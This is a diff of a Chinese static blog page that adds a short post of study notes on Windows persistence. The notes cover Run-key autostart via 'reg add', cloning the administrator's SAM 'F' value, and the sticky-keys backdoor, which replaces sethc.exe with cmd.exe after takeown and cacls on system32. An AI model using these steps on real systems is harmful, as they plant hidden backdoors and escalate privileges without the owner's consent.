@@ -64,6 +64,58 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-注册表自启动和粘滞键后门" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" class="article-date">
+  <time datetime="2021-07-12T03:13:16.000Z" itemprop="datePublished">2021-07-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/">注册表自启动和粘滞键后门</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="注册表："><a href="#注册表：" class="headerlink" title="注册表："></a>注册表：</h4><p>​    数据类型：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">REG_SZ：字符串：文本字符串</span><br><span class="line">REG_MULTI_SZ：多字符串值：含有多个文本值的字符串</span><br><span class="line">REG_BINARY：二进制数：二进制值，以十六进制显示，</span><br><span class="line">REG_DWORD：双字值；一个32位的二进制值，显示为8位的十六进制值</span><br></pre></td></tr></table></figure>
+
+<p>​    创建注册表：   regedit</p>
+<p>自启动路径：</p>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RUN</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run &#x2F;v hh &#x2F;d &quot;calc.exe&quot; &#x2F;f</span><br><span class="line">reg add keyname ... 创建注册表</span><br><span class="line">&#x2F;v 注册表取名</span><br><span class="line">&#x2F;d 要执行的命令或者程序</span><br><span class="line">&#x2F;f 强制覆盖</span><br><span class="line"></span><br><span class="line">用户克隆</span><br><span class="line">注册表中sam文件下的administrator账户对应的目录文件中的F值覆盖掉普通用户对应目录的F值，权限会被继承</span><br></pre></td></tr></table></figure>
+
+<p>自启动文件夹：win + R –&gt; shell:startup</p>
+<p>​    C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
+<p>服务配置：win + R –&gt;msconfig</p>
+<p>UAC：user account control（用户账户控制）</p>
+<p>​        最底下：默认以管理员权限运行</p>
+<h4 id="粘滞键后门："><a href="#粘滞键后门：" class="headerlink" title="粘滞键后门："></a>粘滞键后门：</h4><p>​    原理：通过覆盖sethc.exe文件运行cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. takeown &#x2F;F c:\windwos\system32\* &#x2F;A &#x2F;R</span><br><span class="line"></span><br><span class="line">2.cacls c:\windwos\system32\\* &#x2F;T &#x2F;E &#x2F;G administrators:F</span><br><span class="line"></span><br><span class="line">3.copy cmd.exe sethc.exe</span><br><span class="line"></span><br><span class="line">4.连续按5次shift键呼出cmd</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="ckuhtvvnh000wt0vjgt7ehlcf" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-基础命令" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" class="article-date">
@@ -131,7 +183,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="ckue5or3x000uk4vjcnlz8y0i" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="ckuhtvvng000vt0vj9sk582fe" class="article-share-link">Share</a>
       
       
     </footer>
@@ -168,7 +220,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" data-id="ckue5or330005k4vj4ebz9qe3" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" data-id="ckuhtvvm80005t0vj9tkdday7" class="article-share-link">Share</a>
       
       
     </footer>
@@ -205,7 +257,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="ckue5or340006k4vj1jm741jy" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="ckuhtvvm60004t0vj86rdd078" class="article-share-link">Share</a>
       
       
     </footer>
@@ -273,7 +325,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckue5or2x0001k4vjclb1e9ia" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckuhtvvm40003t0vj61oa7dc5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -310,7 +362,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckue5or300002k4vj1thngq03" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckuhtvvlk0000t0vjbx9k0gfq" class="article-share-link">Share</a>
       
       
     </footer>
@@ -359,7 +411,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckue5or3b000dk4vjcitrb2qt" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckuhtvvmo000dt0vjbiare1ot" class="article-share-link">Share</a>
       
       
     </footer>
@@ -405,6 +457,10 @@ default:
       <ul>
         
           <li>
+            <a href="/2021/10/08/sql%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E6%89%A9%E5%B1%95%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/">sql漏洞注入扩展和Access数据库</a>
+          </li>
+        
+          <li>
             <a href="/2021/10/05/sql%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%92%8C%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/">sql漏洞查询方式和报错盲注</a>
           </li>
         
@@ -418,10 +474,6 @@ default:
         
           <li>
             <a href="/2021/09/23/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">sql注入基础</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/19/%E4%BF%A1%E6%81%AF%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/">信息资产收集</a>
           </li>
         
       </ul>
